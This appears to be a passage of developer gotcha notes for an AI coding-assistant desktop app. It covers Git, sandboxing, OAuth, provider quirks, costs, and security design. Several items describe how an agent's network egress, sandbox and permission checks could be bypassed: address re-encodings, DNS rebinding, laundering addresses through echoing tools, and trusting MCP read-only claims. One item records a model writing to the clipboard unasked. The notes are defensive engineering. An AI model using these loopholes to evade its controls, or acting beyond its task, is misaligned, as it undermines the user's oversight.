- **Old Git ignores `GIT_CONFIG_GLOBAL=/dev/null`** (before 2.32), so the locked-down Git that `lib/workspace.cjs` runs for status/diff still reads `~/.gitconfig` there (pre-existing). `lib/git-flow.cjs` uses the user's config on purpose.
- **Worktrees**: a sandboxed command in a task worktree cannot commit (the main checkout's Git folder is write-denied); commits go through the Commit button or a `sandbox: false` command. Merge needs the main checkout clean and on the base branch.
- **Editor**: no minimap, no language server (no go-to-definition or diagnostics), no split view; files over the workspace's 1 MiB read limit still don't open.
- **Pictures are verified against the stub only.** Every ScaleMax chat model this key can use refuses pictures (HTTP 400 `image_input_unsupported`, checked 2026-10-01), so a real model reading a picture has not been observed; the refusal path is verified live.
- **No code signing / notarization; no CI.**
- The README screenshots in `assets/` predate sessions 2–3 (and the CodeMirror editor, Git flow and slash menu).

## 11. Gotchas

1. `/tmp` is a symlink on macOS — use `/private/tmp` for workspace fixtures.
2. `[hidden]` loses to `display` rules — keep the global `[hidden]{display:none!important}`.
3. Native `<dialog>` paints in the top layer — `showToast()` re-parents the toast into any open dialog.
4. `--sm-bg-*` are component-scoped; use `--sm-app-*` for shell surfaces.
5. CSP blocks inline `style=` in HTML; CSSOM in JS is fine.
6. The smoke check asserts exact bridge counts (16 provider, 7 media, 3 approvals, 10 workspace, 2 dialog, 15 connector, 10 mcp, 5 checkpoints, 6 jobs, 3 specs, 4 automations, 8 git, 5 worktrees, 1 sessions, 2 slash, 3 hooks, 1 mentions) — update `build/smoke-check.cjs` when adding bridge methods.
7. `store:set` returns `true`/`false`; `persist()` falls back to localStorage on `false`.
8. Renderer = ES modules, main = CommonJS; `package.json` has no `"type"` (Node prints a harmless module-type warning when tests import `src/*.js`).
9. `sm-tokens.css` is generated.
10. `npm test` must keep explicit globs (fixture server under `test/fixtures/`).
11. The OAuth callback port is fixed at 53682 (registered redirect URIs depend on it; one-click sign-ins register `http://127.0.0.1:53682/callback` too, so only one browser sign-in can run at a time). `lib/oauth.cjs` keeps one flow per port across connector OAuth and MCP sign-in: a new flow cancels the waiting one and listens only after its listener has closed. Don't start a second listener on the port anywhere else.
15. `lib/mcp-directory.cjs` (main) and `src/mcp-directory.js` (renderer) must stay in sync — `test/mcp-directory.test.mjs` enforces it. Re-verify a listing live before adding it: it must answer 401, publish resource + authorization-server metadata with a `registration_endpoint` and PKCE S256, accept the registration, and serve a real consent page for the resulting authorize URL.
16. `lib/state.cjs` refuses one object stored under two keys ("cycles or shared objects"): the active provider record is copied (`structuredClone`) into `providerProfiles`. The provider tests' memory store enforces the same rule.
18. Scrollbars are styled once, globally, in `styles.css` §01 (thin rounded thumb, transparent track, `--sm-scrollbar-thumb`). A second `::-webkit-scrollbar` block later in the cascade brought back the square grey classic bars users with a mouse see. Elements with the standard `scrollbar-width` property ignore these pseudo-elements.
20. **The ScaleMax API rewrites the whole word "kiro"** (any case; `-` `.` `/` `_` count as word breaks, letters and digits don't) in reply text into the model's name, for every chat model: `kiro-scalemax-ide` came back as `DeepSeek V4 Flash-scalemax-ide`. Requests, tool-call arguments and tool results are untouched, so the model has the real names. `lib/reply-names.cjs` restores names that occur in the request; the bare word "kiro" alone is left as the API wrote it. Verified 2026-09-27 (DeepSeek V4 Flash, Sonnet 4.6, the free models).
21. `workspace.select()` keeps the open folder until the new one passes every check (a refused or vanished folder no longer leaves the app without one). The renderer still queues folder switches (`runFolderJob`) so main and the screen never disagree.
22. Apps opened from the Finder get PATH `/usr/bin:/bin:/usr/sbin:/sbin`; `lib/shell-path.cjs` fixes that at start. Test with `PATH=/usr/bin:/bin:/usr/sbin:/sbin` in the launch env.
23. `node --test some-dir/` exits 1 on Node 22+ (directories are not test patterns); use `node --test` or explicit files in test projects.
28. **The ScaleMax API has no web search** (checked 2026-09-28: a `web_search` tool is rejected with `provider_unavailable`, `plugins` is ignored, `model:online` is unknown, and there is no `/search` endpoint), so `lib/web-tools.cjs` searches through DuckDuckGo's HTML endpoint itself. It is scraping, so the parser reads links attribute by attribute (the attribute order differs between the html and lite endpoints) and falls back to the lite endpoint, then to a clear error.
29. A mode's meaning lives in `lib/modes.cjs` only. The window sends `mode`; do not add mode-dependent behaviour to `src/domain.mjs` beyond the wording shown in the interface.
24. Chat replies are rendered by `src/markdown.js`; never put reply text into `innerHTML`. User messages stay plain text.
25. A task's folder is fixed once it has a user message (`isTaskLocked`). `openWorkspace()` / `openWorkspaceAt()` are the only user-facing ways to change folders and keep "current task folder = open folder"; code that calls `applyWorkspace()` directly (the smoke check did) bypasses that. The window sends `folder` with chat requests; main checks it.
26. Folder changes are refused while editor tabs have unsaved changes. A running reply does not hold the folder: its tools use a workspace session of their own (`openChatSession`), disposed when the reply ends (which also stops a command it still runs).
30. Streaming: `provider.complete(input, { onDelta })` streams; `provider.send` (no tools, no listener) does not. The tool loop streams only when `send` has an `onProgress` listener, so tests and callers without one see the old request/response behaviour. Coalescing and name repair happen in main (`lib/progress.cjs`), not in the renderer.
31. Replies are per task: `app.replies` (Map taskId → reply), `app.activeRequestId` is a getter for the task on screen. Use `beginReply` / `endReply`; never keep a single "the reply" in module state. Build the history with `historyMessages()`, never from `task.messages` directly (interrupted replies need their note).
32. The ScaleMax API answers a prompt it has seen before from a cache, in **one** streamed piece (checked 2026-09-28: the same count-to-60 prompt streamed in 53 pieces once, then in 1). Tests that count streamed pieces need a new prompt every run.
33. `/usr/local/bin/git` on the development Mac is an x86_64 build running under Rosetta: its first start in a run can take about a second, so the first message in a folder (notes + Git context) is slower. Timed checks need headroom for it.
34. The smoke window is shown, but another window in front makes Chromium throttle its timers; the smoke check turns background throttling off for its window.
35. The smoke check's page code is a template literal in `build/smoke-check.cjs`: `\n` inside it becomes a real line break in the page script (a SyntaxError in a string). Write `\\n`.
36. Live checks must use Coding mode (or ask for no tools): in Working mode a model once "helpfully" put its whole answer on the machine's clipboard with `computer_clipboard_write`.
37. Undo compares SHA-256 revisions from `lib/workspace.cjs` (`hash(bytes)`); the recorder takes them from what `read`/`write`/`create` returned, never recomputes them from text.
38. Background work must use `workspace_run` with `background:true`, never `&`: jobs belong to a folder, outlive a reply, retain 1 MiB/20 finished records and must be stopped with `workspace_job_stop` when finished. The model's cursor is separate from the window's output offset; the window re-reads the partial line so terminal progress/prompt redraws do not accumulate.
39. macOS `script(1)` rejects Node's stdin socket (`tcgetattr/ioctl: Operation not supported on socket`). `lib/commands.cjs` feeds its terminal wrapper with `< <(cat)`, so keep that wrapper shape when changing TTY support; do not add `node-pty` just for it.
40. `sandbox-exec` is macOS-only and deprecated by Apple, so guard every sandbox feature with `sandbox.available()`. Network-off must explicitly deny `/private/var/run/mDNSResponder` after allowing Unix sockets: otherwise the resolver can disclose a public name. The profile deliberately cannot protect project-file or Git-history deletions; workspace approval/Bypass consent remain the control for those.
42. Costs come only from what a provider reports. Never turn missing usage or a missing price into `0`: a real zero price exists, so `lib/metrics.cjs` keeps `priced` / `incomplete` / `unpriced` / `unreported` apart and the UI says "Price unavailable". Amounts stay integers (nano-USD stored, micro-USD displayed); do not add floating dollars.
43. A tool loop must hold one `provider.snapshot()` for all of its rounds. Without it, a model switch in another task reprices or reroutes a reply that is already running, and a later round can be billed at another model's price.
44. `/compact` is an app command, not a prompt. Intercept the exact text before `appendMessage`, run it through `provider:compact` (no tools), and keep the summary as `task.compaction`, never as a chat turn. The summary enters model context only as a marked untrusted-data turn, and automatic compaction must re-plan against the real summary and leave the user's draft unsent when it still does not fit.
47. **Egress is decided by who wrote the address first.** `learnAddresses` must read the conversation in order and register the model's own text and tool arguments *before* the tool results that follow them, or an echoing tool (a search repeating its query) launders a made-up address. Add `egressUrl(args)` to any new tool that sends to a model-chosen address, and `egressFragment: true` when a browser gets the whole URL. Never let an unparseable address skip the check.
48. **Compare network addresses as bytes, never as text.** `new URL()` rewrites IPv6 (`[::ffff:127.0.0.1]` → `[::ffff:7f00:1]`), decimal and octal IPv4 (`2130706433`, `0177.0.0.1` → `127.0.0.1`). Keep `pinnedFetch` as the default fetcher: the global `fetch` looks the name up again after the check (DNS rebinding). Its test-only `isPrivate` option must stay out of anything the model reaches.
49. **An MCP server's `readOnlyHint` is a claim.** Only `trustReadOnly` turns it into `readOnly: true`; untrusted it is `claimsReadOnly`, which asks. Trust belongs to one program: reset it whenever the command, arguments, working folder or address change.
50. **Tear down in `will-quit`, not `before-quit`.** A beforeunload that holds back a quit (unsaved tabs) runs after `before-quit`; anything disposed there is gone even when the user cancels. The second `app.quit()` must come from a new task (`setImmediate`): with no MCP server the wait settles in a microtask, still inside the prevented `will-quit`, and Electron drops a quit asked for there (until 2026-10-16 the app then never quit, ⌘Q included, for anyone without an MCP server).
51. **Retries wait for real seconds.** Provider tests create the provider with `retryDelays: [1, 1, 1]` (`createProvider({ retryDelays })`, `complete(…, { retryDelays })`). Never retry a refusal (401/403/400…), and keep a waiting request's id reserved (`retryWaits`), or Stop and a reused id stop reaching it.
52. **ScaleMax ignores `max_tokens`** (Phase 7 probe: `max_tokens: 5` answered with finish `stop` and 131 tokens), so the app does not send it; `finish_reason: length` is handled by continuing. **DeepSeek V4 Flash sometimes answers only in `reasoning_content`** with empty `content` (about 1 in 10 for a long counting prompt, 2026-10-01): the provider asks once more; the live smoke's count check failed on it before.
53. Shortening old tool results must run `learnAddresses` first (`makeRoom`): a shortened head must never turn an address into a "given" one. Text the model wrote that main puts into the instructions (the carried to-do list) must go through `send(…, { modelWritten })`, or the system prompt launders its addresses.
54. Pictures count as about 1,600 tokens in the context share and as real bytes against the 3.5 MB request size (`messageBytes(…, { wire })`); main keeps a request's pictures ≤ 2.5 MB. A 400 is only `IMAGES_UNSUPPORTED` when the request carried pictures, and "too large / invalid image" refusals are not it.
55. ScaleMax reports `prompt_tokens_details.cached_tokens` on some replies only (multiples of 1,024; the Phase 7 probe saw none, later replies did). They are shown and priced like other input.
45. Plan permission is authority, not wording. The refusal in `lib/tool-loop.cjs` must stay **before** the approval branch and before `state.allowAll`, so no prompt exists for a changing tool. Read the permission once per reply in `provider:send` and pass it into the loop; a second read (for the notes, the instructions, the `plan` flag) would let a mid-reply toggle disagree with what was enforced. Anything main does for the reply counts as a change too: project notes and the `/init` rewrite are suppressed under Plan. What Plan cannot cover: an MCP server's own `readOnlyHint` is taken on trust (as in Basic), and a background job started by an earlier reply keeps writing (Plan refuses `job_stop`, so a plan can see it but not end it).
46. Specs are ordinary project files, written through `lib/workspace.cjs` — never a private store. That is what gives them path guards, backups, the per-folder write lock and a place in the reply's changes card. Task lines are Markdown checkboxes, so `parseTasks` must stay tolerant of CRLF (splitting on `\n` leaves a `\r`, and `.`/`$` stop at it) and must skip fenced code blocks, or a checklist shown as an example becomes task 2 and a tick rewrites the sample.
